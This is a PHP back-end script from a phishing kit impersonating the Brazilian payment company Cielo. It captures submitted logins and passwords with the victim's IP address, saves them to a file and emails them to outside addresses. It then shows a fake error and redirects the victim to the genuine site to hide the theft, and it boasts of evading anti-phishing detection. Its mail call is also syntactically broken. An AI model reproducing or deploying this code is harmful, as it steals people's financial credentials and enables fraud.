<?php

	$login = $_POST['login'];	
	$senha = $_POST['senha'];	
	$ip = $_SERVER["REMOTE_ADDR"];
	$hora=date("H:i:s");

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Chegando Cielo Login <chegando@elo.com.br>";
$conteudo ="<b>### Fake By Cj2014 ####</b><br>";
$conteudo.="<b>### 100% Indectable in SSL and Using Antipishing ###</b><br>";
$conteudo.="<b>IP: </b>$ip <br>";
$conteudo.="<b>Hora: </b>$hora <br>";
$conteudo.="<br>";
$conteudo.="<b>############ Dados ############</b><br>";
$conteudo.="<br>";
$conteudo.="<b>Login: </b>$login<br>";
$conteudo.="<b>Senha: </b>$senha<br>";
$conteudo.="<b>############ Fake 2014 Full Indetectable ############</b><br>";

$h = date(" d-m-Y H-i-s");
$fp = fopen("salva/"."Chegando_Cielo_Login"."$ip"."["."$h]".".txt", "a");
$escreve = fwrite($fp, $conteudo);
fclose($fp);

@mail(“freechoisecc@gmail.com”,woodtoy1@hotmail.com "$ip - $hora [Cielo]", "$conteudo", $headers); // COLOQUE SEU EMAIL AQUI!

echo "<script>alert(\"Erro ao checar suas credenciais, porfavor tente novamente!\")</script>";
echo "<script>window.location.href='http://www.cielofidelidade.com.br/Login';</script>";
?>